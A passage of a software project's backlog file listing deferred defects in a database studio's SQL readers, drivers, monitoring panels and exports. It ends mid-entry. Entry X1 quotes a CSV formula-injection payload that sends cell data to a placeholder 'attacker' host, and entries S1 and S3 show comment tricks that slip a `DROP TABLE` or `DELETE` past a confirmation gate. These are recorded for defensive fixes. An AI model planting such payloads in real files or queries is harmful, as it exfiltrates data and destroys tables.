# Backlog — known defects and deferred work

Work that is known, understood, and not scheduled. Every entry was found while doing something
else — a sweep, a review, a live probe — and was verified against the code when it was written.
None of it is a GitHub issue.

**How this file is used**

- The issue tracker holds work that is filed, triaged, or in progress. This file holds the rest:
  unscheduled defects, deliberate deferrals, open questions.
- An entry says what is wrong, where, and what "done" looks like. Enough to pick it up cold.
- **Delete an entry when the work lands.** No strikethrough, no DONE marker. Git history is the record.
- Re-verify before acting. Line numbers and behaviour claims age.
- Promote an entry to an issue when it needs discussion, an outside reporter, or a release note.
- The reverse happens too. An issue that is understood, breaks nothing today and is not scheduled
  belongs here. Close it with a pointer to its entry. A defect a user can hit stays an issue.
- **Every ID is unique across the whole file.** Cross-references use the bare ID (`B47`), so no two
  entries may share one.

---

**Sections**

- [SQL statement reading](#sql-statement-reading) — S1–S8 · 8
- [Drivers and connections](#drivers-and-connections) — D1–D10, U17 · 11
- [Value interpolation](#value-interpolation) — V1
- [Row editing](#row-editing) — R1
- [Studio UI and query execution](#studio-ui-and-query-execution) — X1–X7, U2–U18 · 20
- [Authentication and security headers](#authentication-and-security-headers) — AU1–AU2 · 2
- [Tests](#tests) — T1–T3 · 3
- [Dependencies](#dependencies) — P1–P6 · 6
- [Documentation](#documentation) — DOC1–DOC3 · 3
- [Release pipeline](#release-pipeline) — REL1
- [Chart configuration surface](#chart-configuration-surface) — N1–N3 · 3
- [Container runtime](#container-runtime) — U15
- [Security Phase 1 deferrals](#security-phase-1-deferrals) — H1–H13 · 13
- [Security Phase 2 deferrals](#security-phase-2-deferrals) — C1–C10 · 10
- [Security Phase 3 deferrals](#security-phase-3-deferrals) — K1–K4 · 4
- [Agent M1 deferrals (#328)](#agent-m1-deferrals-328) — A1–A6 · 5
- [Agent M2 deferrals (#329)](#agent-m2-deferrals-329) — B1–B56 · 46

---

## SQL statement reading

The readers in `src/lib/sql/` decide where a statement starts, where it ends, and what it operates
on. `src/lib/sql/grammar.ts` gave them a dialect (#292). These are the gaps that channel leaves.

### S1. `statement-splitter.ts` is dialect-blind, and one shape yields a runnable bare `DROP`

`src/lib/sql/statement-splitter.ts` walks spans itself instead of using `spans.ts`, so it disagrees
with every other reader. A `;` inside a MySQL `#` comment, an Oracle `q'{a'b;c}'` body, a `[a;b]`
name or a backtick-quoted subscript key each split one statement into fragments.

The sharp case: `/* a /* b */ ; DROP TABLE users; -- */ SELECT 1` splits into three fragments. The
second is a valid bare `DROP TABLE users` that the multi-statement route would run. `isDangerousQuery`
answers false, because the confirmation gate reads the whole editor text and never the fragments.
Same family as #300, wider blast radius.

**Done when:** the splitter reads spans through the shared reader with the caller's dialect, and the
gate and the splitter agree about what is going to run.

### S2. Backslash escaping is not a grammar fact

Whether `\` escapes inside a string literal differs by dialect, and in MySQL by session mode. Making
it a row in `SqlGrammar` would narrow the false confirmation prompts #297 introduced, and would
remove S4's MSSQL decline entirely.

Left out of maintainer-sweep-5 on purpose: it retypes every literal in every dialect. It also
destroys the premise of two fixtures that sweep required (the "end cannot be cut" case and the
"genuinely unresolvable text still has to ask" case). Those fixtures need replacing with shapes that
stay unresolvable once `\` is understood.

The single largest follow-up from that sweep.

### S3. Comment and escape forms no reader models

- **MySQL executable comments.** `/*!40000 DELETE FROM t */` is an ordinary comment to every reader
  here. MySQL executes it. Nothing asks first.
- **ClickHouse `//`.** Accepted as a line comment (live-verified), modelled nowhere. So
  `// note\nDROP TABLE t` answers not-dangerous. CQL has the same form — see U17.
- **MySQL connection charset.** On a `latin1` connection a leading U+00A0 executes. `buildPoolConfig`
  passes the user's connection string straight to mysql2 as `uri`, so the charset is outside the
  readers' view.

### S4. MSSQL: a parameterised page is still unrecognised

`… OFFSET @skip ROWS` is not recognised as a page, so the statement collects a `TOP` and the server
refuses it. A limitation of the shared probes' literal-count reading as much as of the provider.
Verified by probe, documented in `docs/providers/mssql.md`.

The decline that keeps #293 safe keys on an unanchored `OFFSET`/`FETCH` mention wherever the cut was
refused. The precise alternative — walk forward to where the unresolvable region starts — only helps
for a mention *before* the bad span, and costs a new shared-reader API.

### S5. The limiter's whole-body probes still read inside comments

`src/lib/db/utils/query-limiter.ts` runs its `ROWNUM` test, its `UNION` test and its subquery
`SELECT` count over the whole statement text. A statement that merely *mentions* a bound in an
interior comment therefore reads as already bounded. The statement's *type* stopped being fooled this
way in maintainer-sweep-4/5; these flags did not.

### S6. Grammar facts left undecided

`grammar.ts` records a fact as established only when a first-party source was found. Where none was,
it writes `DEFAULT_SQL_GRAMMAR.<fact>`. Three such sites remain, all on the same fact:

| Fact | Undecided for |
|---|---|
| `[…]` bracket reading | mysql, oracle, elasticsearch |

`#` and block-comment nesting are now established for every dialect that has a grammar row.
ClickHouse's three facts were established after this entry was first written.

**A different state, not an undecided fact:** couchbase, druid and libredb have no row in
`SQL_GRAMMARS` at all, so they fall to the whole default. Nobody has probed them.

Leaving a bracket row undecided costs nothing while the dialect does not use the syntax — `[` carries
no meaning in ordinary MySQL or Oracle SQL, and Elasticsearch refuses it outright. It costs something
when the dialect does use it. That is why PostgreSQL's row was established: at the name reading,
`ARRAY[[1,2],[3,4]]` and `j['a]b']` lost their bound and prompted on an ordinary read.

**Rows resting on documentation alone, worth re-checking against an artifact:** ClickHouse's `#` and
bracket rows (HTTP-only provider, no driver to read), MSSQL's block-comment nesting row (tedious
ships no tokenizer), PostgreSQL's bracket and block-comment rows (`pg` carries no SQL tokenizer), and
the `nq'…'` spelling of Oracle's alternate quoting.

**Missing fact, not an undecided one:** `SqlGrammar` has no `lineComment` row, so it cannot express
CQL's `//` or its newline-terminated comments. See U17.1.

### S7. A confirmation refinement that was considered and rejected

Scanning an unreadable region for destructive vocabulary, and asking only when a write could
plausibly be in there. Sound on its face. It substitutes a cleverer reading for the honesty rule #297
pinned: the gate asks because it *cannot* read the text, not because it guessed what is in it.
Revisit only with an explicit product decision.

### S8. The confirmation gate's destructive vocabulary is SQL-only

`isDangerousQuery` recognises SQL keywords. It is close to inert for the two non-SQL types it is
still asked about: a Redis `FLUSHALL` or `DEL key`, and a MongoDB `{"operation":"drop"}`, are
destructive and match nothing. The span-based half of the gate no longer fires on their text at all,
which leaves the keyword half as the only check — and it does not speak their languages.

**Done when:** a destructive MongoDB operation and a destructive Redis command each ask before
running, driven from one type-to-facts place rather than a type test in the component.

---

## Drivers and connections

### D1. Fatal `error` events on the non-pooled clients were never audited

#298 covered the pooled SQL drivers (`pg` in both layers, `mssql`). mysql2 and oracledb have no
pool-level `error` event, and each `connect()` now records that.

Whether the MongoDB, Redis, ClickHouse, Druid, Couchbase, Cassandra or Trino clients expose a fatal
`error` event that can reach `uncaughtException` is an open question, not a claim.

### D2. Oracle, MongoDB and Redis ignore the SSL/TLS panel the connection dialog shows them

`ConnectionModal.tsx` gates the SSL/TLS and SSH tunnel panels on `!isFileBased(type)`. Every engine
except the two file-based ones (`sqlite`, `libredb`) renders both.

The defect is narrow: **the visible `config.ssl` selection is not enforced by three providers.**
`oracle.ts`, `mongodb.ts` and `redis.ts` never read it. A user who sets the mode to `require` on
those three gets no error and no guarantee. The connection may still be encrypted, but only if the
connection string says so: `oracle.ts` passes a supplied `connectionString` through verbatim, and the
MongoDB driver honours `tls=true` in the URI. Silently accepting a security setting and dropping it
is the problem, not plaintext.

Every other provider reads it — postgres, mysql, mssql, couchbase, clickhouse, druid, cassandra,
trino and the two search providers.

Two scope facts worth keeping straight:

- The SSH tunnel is provider-independent. `factory.ts` opens it and rewrites host/port before
  `createDatabaseProvider`, but skips it when either is absent. Connection-string mode (mongodb,
  couchbase, clickhouse) clears both in `use-connection-form.ts`, so those connections are not
  tunnelled even though the panel is offered.
- "Every engine except SQLite" is wrong twice over. See the file-based pair above.

The READMEs now state the real scope, so the documentation half is closed. The UI half is open.

**Done when:** the three providers are wired (oracledb via the connect string, `mongodb` via `tls`
options, `ioredis` via `tls`), or the panel is hidden where it cannot be honoured.

### D3. Testing a connection to an already-open embedded file fails on its own exclusive lock

`POST /api/db/test-connection` calls `createDatabaseProvider` directly rather than going through the
cached provider. That is right for credentials the server has never seen, and wrong for an engine
that permits one writer. If the connection under test points at a file the cached provider already
holds, the second open is refused:

```
[DB] Creating libredb provider for "Sample (LibreDB)"      <- cached, holds the file
[DB] Creating libredb provider for "My Sample"             <- the test, same file
ConnectionError: LibreDB file is already open by another process (exclusive lock).
```

Deterministic, not a race. It reproduces every time on the active LibreDB connection.

The consequence is worse than a failed test, because the modal tests before it saves. **Editing the
built-in LibreDB sample is impossible.** The edit is discarded with a toast about a connection error,
which reads as if the sample itself were broken. Reproduced against a production build on 2026-08-12
while verifying #336.

An earlier session recorded this and then retracted it as unreproducible. The retraction of the
*explanation* stands — it blamed a read-then-write window in the provider cache, which is not what
happens. The phenomenon is real; those attempts never went through the modal's test path.

Same lock, same fix as B49. Close the two together.

**Done when:** testing a connection that resolves to an already-open single-writer file reuses the
open provider, or the test is skipped with an honest message. Either way the modal must not present a
lock conflict as a failed connection test.

### D4. A MongoDB connection cannot name the database its credentials live in (`authSource`)

`buildConnectionString()` composes `mongodb://user:pass@host:port/<database>` and nothing else.
`authSource` appears nowhere in the repository: not in the form, not in `DatabaseConnection`, not in
the driver options. The driver authenticates against the database named in the URI when no
`authSource` is given, so the ordinary deployment — users in `admin`, data elsewhere — cannot be
connected to through the form fields at all. It fails as a credentials error, which is what it looks
like and is not what it is.

The workaround exists and is not discoverable: MongoDB offers the connection-string toggle, and a
pasted `mongodb://user:pass@host:port/shop?authSource=admin` passes through verbatim.

Raised while driving agent grounding (#414) and left out of it: this is a connection-form feature.

**Done when:** the form carries an optional auth-database field that reaches the URI, with the
provider triad (code, `docs/providers/mongodb.md`, `tests/integration/db/mongodb-provider.test.ts`).

### D5. A trailing semicolon reaches Trino unchanged, and Trino is the one engine that refuses it

Measured against Trino 476: `SELECT 1;` answers `SYNTAX_ERROR`, `line 1:9: mismatched input ';'`.
`SELECT 1` succeeds. `TrinoHttpTransport` sends the statement text verbatim, so
`provider.query("SELECT 1;")` fails on Trino and succeeds on every other SQL engine we ship.

**Not reachable through the product.** `splitStatements()` consumes the semicolon as the delimiter,
so nothing typed in the editor carries one to a provider. The exposure is the published library
surface: a consumer calling `query()` directly gets an engine-specific failure with no hint that the
semicolon caused it.

Two things make it worth recording. The transport's own comment says "no trailing semicolon", which
states a requirement nothing enforces — corrected when this entry was filed, so it no longer implies
a strip that does not happen. And the provider already absorbs one Trino quirk for the caller:
`prepareQuery()` transposes `LIMIT n OFFSET m` into `OFFSET m LIMIT n`, because only the second order
parses. Absorbing one and not the other is the inconsistency.

**Done when:** the transport drops a single trailing semicolon before the statement leaves it, with a
test proving `SELECT 1;` and `SELECT 1` reach the wire identically, and `docs/providers/trino.md`
saying so. Deliberately NOT a general splitter: `SELECT 1; SELECT 2` must keep failing, because the
endpoint takes exactly one statement.

Found reviewing #438 against the live cluster. Not raised by that PR's external review.

### D6. The MySQL index-size query assumes InnoDB names its table after the database you connected to

`INDEX_SIZES_SQL` in `src/lib/db/providers/sql/mysql.ts` filters
`information_schema.INNODB_TABLES.NAME LIKE ?`, and `getIndexStats` passes `` `${schema}/%` `` — the
connection's own database plus a slash. That is InnoDB's convention on a single MySQL server, and the
query treats it as universal.

Measured 2026-08-20 against Vitess 24.0.2 (`vitess/vttestserver:v24.0.2-mysql80`, keyspace `probe`):
**every per-index size reads 0 bytes.** Vitess names the InnoDB table after the physical shard
database, so the rows are `vt_probe_0/orders` and `LIKE 'probe/%'` matches none. The same query
returns 35 rows against a MySQL 9 control, so the statement is fine and the parameter is not.

**The defect is ours.** Vitess publishes the sizes under the name its own storage uses. The provider
asks for a name only an unsharded single server has, then swallows the mismatch: the lookup sits in a
`try {} catch {}` commented "INNODB_SYS tables not available", so zero matched rows is
indistinguishable from a server with no such catalog. The join key repeats the assumption — the map is
keyed on `INNODB_TABLES.NAME` and looked up with `${r.schema_name}/${r.table_name}` from
`information_schema.STATISTICS`, so a matched row would still need the two catalogs to agree.

The result is the class this repo treats as worse than a blank panel. The index rows come from
`STATISTICS`, which answers, so every index lists with a size of 0 B. A wrong number, not a missing one.

**Done when:** a per-index size on Vitess reads what `INNODB_INDEXES` holds, or the panel reports the
size as unavailable rather than 0.

### D7. Three providers answer the performance panel with a fabricated cache hit ratio

Three sites, all reaching the panel indistinguishable from a measurement:

- **MySQL** — `mysql.ts:853` returns `cacheHitRatio: 99` from a `catch` commented "Fallback if
  performance_schema is not available". Two more sites default the same way when the row is simply
  absent: `mysql.ts:648` and `:826` both read `hitRows[0]?.hit_ratio || 99`.
- **MongoDB** — the same literal in the same position (`document/mongodb.ts`, which at least logs first).
- **LibreDB** — `embedded/libredb.ts:526` returns `cacheHitRatio: 100` unconditionally.

Measured 2026-08-20 against a live OceanBase Community Edition 4.4.2.1 through the shipped `mysql`
provider: the tenant has no `performance_schema` database at all (`ERROR 1049`). That `catch` is not
an edge case there, it is the only path. The panel reports **99 percent cache hit, 0 queries per
second, 0 buffer pool, 0 deadlocks** on every refresh, forever.

This is the failure class #424 exists to refuse — "a missing panel is honest; a populated wrong one is
not" — and it is worse here, because the engine is not the author of the number. We are.

**#452 cannot reach this.** That PR taught the five monitoring tabs to render an omitted metric as
unavailable rather than as zero. A fabricated `99` is not an absence, so there is nothing for a panel
to detect.

**Done when:** a provider that cannot measure the cache hit ratio reports it as unavailable, on all
sites listed above.

### D8. The MySQL provider only uses the prepared protocol, and two engines lose panels to it

Every read in `src/lib/db/providers/sql/mysql.ts` goes through mysql2's `conn.execute` — the binary
PREPARED protocol — and never `conn.query`. There is no site that chooses: `getHealth`, `getOverview`,
`getPerformanceMetrics`, the maintenance statement and the editor's own query path all call `execute`,
including for statements that carry no parameters.

Measured 2026-08-20 against a live SingleStore 9.1.1
(`ghcr.io/singlestore-labs/singlestoredb-dev:0.2.82`), both ways on one connection:

| Statement | `conn.execute` | `conn.query` |
|---|---|---|
| `SHOW STATUS LIKE 'Uptime'` | fails | succeeds |
| `SHOW VARIABLES LIKE 'max_connections'` | fails | succeeds |
| `EXPLAIN FORMAT=JSON <select>` | fails | succeeds |
| `EXPLAIN <select>` | fails | succeeds |
| `OPTIMIZE TABLE orders` | fails | succeeds |
| `CHECK TABLE orders` | fails | succeeds |
| `ANALYZE TABLE orders` | succeeds | succeeds |

Every failure is the same engine message: `This command is not supported in the prepared statement
protocol yet`. The last row is the tell — `ANALYZE TABLE` is the one maintenance action that works on
SingleStore, and the one statement in that list the prepared protocol accepts.

The cost on SingleStore is **five of its six defects**: Test Connection, health, the overview, the
monitoring dashboard and the Explain panel (whose statement `src/lib/explain/mysql-json.ts` builds as
`EXPLAIN FORMAT=JSON` and runs down the same path). Two of three maintenance actions go with them.

**Not SingleStore-only.** The registered StarRocks row in `docs/providers/README.md` records its
overview and health failures on the prepared-statement protocol — same cause, different engine,
written up there as that engine's own quirk. One change reaches both.

**The recovery is plausible and unmeasured.** The probe showed those statements succeed on
`conn.query`. It did not show the provider working that way: nothing was changed and no panel was
re-run. So six surfaces and two maintenance actions are candidates for recovery, not promises.

**Done when:** a parameterless statement the provider issues goes over the text protocol, and the
SingleStore and StarRocks rows in `docs/providers/README.md` are re-probed against that build.

---
### D9. The Cassandra monitoring surfaces throw when `system_views` is absent, and a registered engine loses six of them

Four reads in `src/lib/db/providers/sql/cassandra/introspect.ts` query Cassandra's `system_views`
virtual tables with no path for that keyspace not existing: `getOverview` (371),
`getPerformanceMetrics` (426), `getActiveSessions` (455) and `getHealth` (533). `getMonitoringData` is
the fifth failure, because `base-provider.ts:99` aggregates those. Test Connection is the sixth:
`POST /api/db/test-connection` calls `provider.getHealth()`
(`src/app/api/db/test-connection/route.ts:33`).

Measured 2026-08-21/22 against live `scylladb/scylla:2026.2.4` and `scylladb/scylla:2025.1` through
`createDatabaseProvider({type:"cassandra"})`, surface by surface, with `cassandra:5.0.9` in the same
pass. All thirteen surfaces this provider offers pass on 5.0.9 — thirteen because it offers neither
cancellation nor `EXPLAIN`. On both ScyllaDB builds the same five fail with the same verbatim error,
`Keyspace system_views does not exist`, and the other eight pass: `connect`, `query`, `getSchema`,
`getSlowQueries`, `getTableStats`, `getIndexStats`, `getStorageStats`, `disconnect`. ScyllaDB has no
`system_views` keyspace at all; `system.local`, `system_schema.*` and `system.size_estimates` all
exist and answer.

**The seventh failure is what makes this a blocker rather than a blemish, and only a browser pass
found it.** `handleConnect` (`src/hooks/use-connection-form.ts:346`) gates the SAVE on that same
request — `if (result.success) onConnect(conn)` — so Establish Connection refuses too and nothing is
stored. A ScyllaDB connection cannot be created through the connection dialog at all; the browser
pass reached the editor only through a seeded, admin-managed connection. **Not ScyllaDB-only:**
StarRocks and SingleStore are registered relatives whose health surface also fails (D8), so the same
gate applies to them by inspection — measured for ScyllaDB, inferred for those two, recorded in
neither row.

Two more surfaces were measured while there. The monitoring dashboard renders one *Connection Error*
page reading `Keyspace system_views does not exist`, which the connection is not — the same
mislabelling the Cloudberry row records. The header badge reads *Slow* with the title *Connection:
degraded*, which is the failing health request rather than latency.

**The provider does degrade a monitoring read to empty — but only on the wrong condition.** §3.6 of
`docs/providers/cassandra.md` records the rule as measured: a monitoring read degrades on a
`permission` denial (Cassandra error 8448) **and on nothing else**, deliberately, so that a typo in
this provider's own CQL is not hidden by an empty panel. An absent keyspace is not a denial, so it
propagates.

**The recovery is plausible and unmeasured, and the difference matters.** Widening the degradation
contract to cover an absent `system_views` would plausibly lift the ScyllaDB row in
`src/lib/db/compatibility.ts` from `partial` to `full` and make the dialog work. Nothing was changed
and no panel was re-run, so that is a candidate, not a result. It is also not free: it widens the
condition §3.6 argues for narrowing, so a `system_views` typo in our own CQL must still surface as a
failure rather than an empty panel.

**Done when:** an absent `system_views` keyspace degrades those five reads the way a denial does, a
`system_views` typo still fails loudly, the dialog can create a ScyllaDB connection — or the save
stops being gated on health, which is the wider question and should be answered for StarRocks and
SingleStore in the same pass — and the ScyllaDB row in `docs/providers/README.md` is re-probed
against that build.

### D10. MongoDB `distinct` takes its field from `options.projection`, and any other spelling silently returns `_id`

`query()`'s `distinct` branch reads the field as
`query.options?.projection ? Object.keys(query.options.projection)[0] : "_id"`
(`src/lib/db/providers/document/mongodb.ts`). So the field is carried by the FIRST KEY of a
projection, which is not what a projection means anywhere else in the envelope, and is documented
nowhere: `docs/providers/mongodb.md` §3.1 lists `distinct` among the supported operations and shows
no example of one.

Measured 2026-08-22 against live `mongo:latest`, 120 seeded products in five categories:

| Sent | Answered |
| --- | --- |
| `{"operation":"distinct","filter":{},"field":"category"}` | 120 rows of `_id` — the `field` key is ignored and the default stands |
| `{"operation":"distinct","options":{"projection":{"category":1}}}` | 5 rows: books, clothing, electronics, home, sports |

The first is the failure mode that matters: `field` is the obvious spelling (it is the driver's own
parameter name), it is accepted without complaint, and the answer is a plausible-looking list of ids
rather than an error. A user reads it as "this collection has 120 distinct categories".

**Done when:** `distinct` takes its field from a named key, an unknown or missing one is a
`QueryError` naming what it expected rather than a silent `_id`, and §3.1 shows a `distinct` example.
The driver's spelling (`field`) is the one to accept; `options.projection` may stay as a compatible
alias or go, since nothing in the product generates a `distinct` today.

---
### U17. Four things the Cassandra provider declined to do

The provider shipped in #424 Phase 4 with four bounded absences. None is a defect — each is the
honest answer to something measured on Apache Cassandra 5.0.9. Each is also something a later change
could take further, and one of them is a shared-reader limitation rather than a provider decision.

**1. `SqlGrammar` cannot express CQL's comment rules, so the provider works around them.** Two facts,
both measured. CQL has a THIRD line-comment form, `//`, which the readers in `src/lib/sql/` know
nothing about. And a line comment of EITHER form must be closed by a NEWLINE: `SELECT * FROM
probe.customers LIMIT 3 -- note` with nothing after it is `line 1:45 mismatched character '<EOF>'
expecting set null`, while the same text plus `\n` returns the rows.

So the shared limiter's insert-before-trailing-trivia rewrite (#280) turns a VALID statement into a
syntax error on this one engine, because `sql.trim()` drops the newline that closed the comment.
`CassandraProvider.prepareQuery` declines to rewrite any statement whose rewritten form would end
inside a line comment. Fail-safe: the statement runs unbounded and `wasLimited: false` says so.
Widening `SqlGrammar` with a `lineComment` fact would fix it properly and would change how every
dialect's comments are read, so it is its own change. See S6.

**2. A statement whose last clause is `PER PARTITION LIMIT n` is left unbounded.** The shared reader
sees a trailing `LIMIT n` and reports the statement as already bounded, so nothing is injected. `...
PER PARTITION LIMIT 2 LIMIT 3` is valid CQL (measured), so a bound COULD be added — but only by
stripping the clause the reader matched, which would corrupt the statement. The reader has to
distinguish the two clauses first.

**3. TLS is wired and unverified.** `cassandraClientOptions` maps the connection's SSL mode onto the
driver's `sslOptions` (`require` → `rejectUnauthorized: false`, `verify-*` → `true`, plus a CA when
supplied), and the shape is pinned by unit tests. Neither probe instance speaks TLS, so no handshake
was ever performed. The alternative — ignoring the form's SSL panel — would send plaintext to a TLS
port silently, which is worse.

**4. Tracing is not exposed.** Cassandra's only substitute for EXPLAIN is `{traceQuery: true}` plus
`system_traces.sessions` / `system_traces.events`, which describes a statement that has ALREADY RUN.
It is a profile, not a plan, and `supportsExplain` is false. If it is ever surfaced it must not be
called EXPLAIN and must not be wired to `explainFormat`.

**ScyllaDB now has its gate-4 probe, and two of the three doubts held.** Probed 2026-08-21/22
against `scylladb/scylla:2026.2.4` and `scylladb/scylla:2025.1`, both through
`createDatabaseProvider({type:"cassandra"})` surface by surface, with `cassandra:5.0.9` in the same
pass. What held: there is no `system_views` keyspace at all, and the version string is not
`release_version`-shaped — `system.local.release_version` reads `3.0.8` and the real build lives in
`system.versions`, which this provider does not read. What was refuted: `gossip_generation` exists on
ScyllaDB and answers. It is registered as a `partial` relative in `src/lib/db/compatibility.ts`; the
six surfaces it loses are D9, which that change deliberately did not fix.

**And there is no `e2e/cassandra-provider.spec.ts`,** unlike Trino: the container takes about 206
seconds to reach `nodetool status` UN from cold, longer than any existing e2e fixture waits. The
ScyllaDB container is ready in well under a minute, so a ScyllaDB-only spec would not be blocked on
boot time — but the Cassandra spec this item asks for still is, and a spec that never starts the
Cassandra fixture does not close it.

**Done when:** each of the four has been taken further or judged settled, and
`e2e/cassandra-provider.spec.ts` exists or a written reason it cannot exist is recorded here.
---


## Value interpolation

### V1. Query history records the placeholders, not the values that were bound

Since #290 the inline row editor sends `SET "name" = $1` with the value bound, and
`use-query-execution` writes that text to history. A truthful record of the statement the engine ran,
but no longer a record of what was written. Carrying the bound values as their own history field
would restore the audit trail without putting them back into the SQL. It touches the history entry
shape in `src/lib/storage`, so it is a schema change.

---

## Row editing

### R1. Row editing is offered only where a shared `UPDATE` happens to fit (was #279)

The results grid builds one statement shape for every engine — `UPDATE <table> SET <col> = <val>
WHERE <pk> = <val>` in `src/hooks/use-inline-editing.ts` — so an engine that spells a row mutation
differently cannot have the feature. #269 made that honest rather than broken: `supportsInlineRowEdit`
hides the control where the shape does not fit. True today for PostgreSQL, MySQL, SQLite, Oracle and
SQL Server; false everywhere else.

Making it work means moving statement generation into the provider, so each dialect owns its own
form. SQL providers keep the shape above. ClickHouse spells it `ALTER TABLE <t> UPDATE <col> = <val>
WHERE ...`. MongoDB has no statement at all and needs the document-update path. An append-only engine
keeps declaring the capability false. The provider triad applies, per provider.

Two constraints from #269 that do not go away:

- **One request per edited row.** Several engines reject a multi-statement request, so the old
  newline-joined payload cannot come back.
- **Primary-key detection is heuristic.** The hook picks a result column named `id` or ending in
  `_id`. Acceptable for a control gated on an opt-in capability; per-dialect editing on real tables
  should derive the key from the schema.

Whether row editing should be universal at all is a product decision. The published
`WorkspaceFeatures.inlineEditing` flag is deprecated against this entry (#288): it becomes real, or
goes away in a major, with this work.

---

## Studio UI and query execution

`U2` came out of the #384 review. The `X` entries came out of the #422 export review — each was
named, weighed and left out of that PR, so they are recorded rather than re-derived.

### X1. A CSV cell beginning `=`, `+`, `-` or `@` is a formula to a spreadsheet

`src/lib/export/csv.ts` writes the value it was given, exactly. A cell holding
`=HYPERLINK("http://attacker/"&A1)` is data in the database and a formula in Excel, LibreOffice and
Google Sheets. It evaluates when someone who did not write the query opens the file.

The fix is not in doubt (prefix with `'`, or wrap it), but it MUTATES the user's values on the way
out — the opposite of what every other line in that file does. That is a product decision about which
of two wrong answers to give, and it wants an owner: a checkbox on the export menu, a setting, or a
rule the docs state.

**Done when:** a cell a spreadsheet would evaluate cannot be evaluated by opening the file, and the
choice is stated where the user makes it.

### X2. An export writes the page the grid holds, not the result the user asked for

Statements run under `DEFAULT_QUERY_LIMIT` (500) and paging fetches more only when asked, so every
export is bounded by what is on screen. #422 made that visible — the count is on the Export button and
the menu says when more rows are still on the server (`src/lib/export/scope.ts`). Honesty, not a fix.

The fix is a server-side export: a route that streams the statement's full result through the same
writers. `csv.ts` and `result-export.ts` are pure and hold no browser reference precisely so a route
can reuse them; `download.ts` is the only browser-bound module there. Worth costing against the
agent's own export gap (B33, B34), which wants the same route.

### X3. A binary column exports as its JSON shape

A `bytea`/`BLOB` value arrives in the browser as `{"type":"Buffer","data":[1,2,…]}` — the shape
`JSON.stringify` gives a Node Buffer — and both the grid and the CSV write exactly that. A megabyte
of data becomes about four megabytes of digits, and no reader can turn it back.

Deliberately NOT fixed in the export path alone. `src/components/results-grid/renderers/` classifies
a value by shape and is the one place both surfaces read. A binary rule belongs there, so the grid,
the row detail sheet and the export agree on hex, base64 or a truncation. Fixing only the writer
would make the file disagree with the screen.

### X4. Four modals stay mounted while closed, so their code cannot be split

`DataProfiler`, `CodeGenerator`, `TestDataGenerator` and `DataImportModal` render `null` when closed
but are always mounted. Lazy-loading them buys nothing until the mount is gated, and gating the mount
changes their semantics (state resets on close). A behaviour change, not a bundling one.

### X5. `Studio.tsx` re-renders its whole tree on every keystroke

14 `useState`, no `useMemo`/`useCallback`, no memoized children, React Compiler off. #422's
code-splitting is not this fix and does not help it. It touches every prop in the shell, which is why
it was not mixed into a correctness PR.

`framer-motion` is also still in the first load: `Studio.tsx`, `ConnectionModal`, `SchemaExplorer`,
`ConnectionItem` and `TableItem` all import it statically and all mount on arrival.

### X6. 43 lists outside `SchemaDiff` are still keyed by index

`VisualExplain`, `DatabaseDocs` and the monitoring/admin tabs. `SchemaDiff` was fixed in #422 because
its rows are recomputed and reordered. The rest need reading one at a time, to tell the stable lists
(where an index key is fine) from the rest.

### X7. The DDL export types a numeric or a timestamp column as TEXT, because the wire hands it a string

Measured in the browser against the local `dvdrental` (2026-08-18):
`SELECT rental_rate, last_update, film_id FROM film` exports as
`CREATE TABLE … ("rental_rate" TEXT, "last_update" TEXT, "film_id" BIGINT)`.

Nothing is wrong with the inference. It never sees a number: `pg` returns `numeric` as a string to
keep its precision, the API serializes to JSON, and a `timestamp` is a string by the time the browser
reads it. So a value-shaped guess can only recover integer, boolean and text, and the dialect
spellings #422 added (`NUMBER(19)`, `BINARY_DOUBLE`, `DATETIME2`, …) apply to those three kinds.

The type is not lost, only unreported. `QueryResult.columnTypes` is the channel, and six provider
families populate it today: ClickHouse, Druid, Trino, Cassandra and the two search engines. The gap is
the drivers that hand back strings — `pg`, `mysql2`, `oracledb`, `mssql`.

Guessing from a string's SHAPE is not the fix and should not be attempted: it types a text column
holding `2026-01-01` as a timestamp.

**Done when:** every provider fills `columnTypes` for the columns it declares — the provider triad's
own work, one PR. It also lets the grid label a column without guessing
(`ResultsGrid.declaredTypeOf` already reads it).

### U2. The rule that catches an arity change on a JSX handler is configured but not aimed at components

`eslint.config.mjs` scopes the type-aware layer to `src/app/api/**`, `src/lib/db/**` and
`src/lib/storage/**`. `@typescript-eslint/no-misused-promises` is already `error` there, and its
`checksVoidReturn.attributes` default is exactly the check that catches a promise-returning function
handed to a JSX handler declaring `() => void`.

That is the defect #384's final commit fixed. `cancelQuery` gained a `tabId?: string` parameter, both
call sites in `Studio.tsx` still passed the function itself to a button's `onClick`, React filled the
slot with its MouseEvent, and Cancel silently stopped cancelling. TypeScript permits it — an optional
parameter still satisfies `() => void` — and the tests could not see it, because they called the
captured prop with no arguments.

Measured, not assumed: extending the layer's `files` to `src/components/Studio.tsx` and restoring the
defect makes ESLint flag both call sites. It also reports 21 further errors in the same file that are
not defects, mostly `onX={() => someAsyncThing()}` where nobody awaits and nobody needs to. Roughly
10:1 noise in one file, so this is not a scope widening that can be merged as-is.

The decision: accept the churn (a braced body or a `void` at each benign site, across the component
tree) for a mechanical gate on a defect class invisible to both the type checker and the tests, or
leave the layer narrow and rely on review. Cost it against all of `src/components/**` first — one
file's ratio is not the tree's.

**Done when:** the scope is widened with the benign sites made explicit, or the decision not to is
recorded here with the number that justified it.

### U3. Provider metadata posts the client's connection object, so a connection-string seed is refused

`useProviderMetadata` posts `JSON.stringify(connection)` — the connection as the CLIENT holds it. For
a managed seed that object is the sanitized one `GET /api/connections/managed` returns, which keeps
only the non-secret fields.

A seed defined by `host` / `port` / `database` / `user` survives that trip with enough left to
construct a provider. All eleven managed seeds were replayed as the client sends them, and every one
answered. A seed defined by `connectionString` does not: the string IS the credential, so nothing
addressable is left and `createDatabaseProvider` throws. Measured on 0.11.0 against a managed MongoDB
seed — `POST /api/db/provider-meta` returns **400**, with `Provider metadata request failed` in the
console and no capabilities for that connection.

The route already accepts the fix. It resolves `body.connectionId` through `resolveConnection`, the
same seam `/api/db/query` and `/api/db/schema` use — which is why a query and a schema read on that
same connection succeed while the metadata call beside them fails. Only this one caller sends the
object instead of the id.

The damage is bounded, because absent metadata reads as unsupported everywhere, and for MongoDB that
is close to the truth: no explain, no create-table, no inline edit. What is lost is the labels — the
explorer says what a Postgres connection would say rather than naming collections — and the loss is
silent. Not a regression: the hook has posted the object since `a4b5cfa` (2026-02-12).

**Done when:** the hook posts `connectionId` and the route resolves it, like its two neighbours.

### U4. The profile modal's error state cannot be dismissed

`DataProfiler` renders the message `/api/db/profile` returned and offers no way out. Escape does not
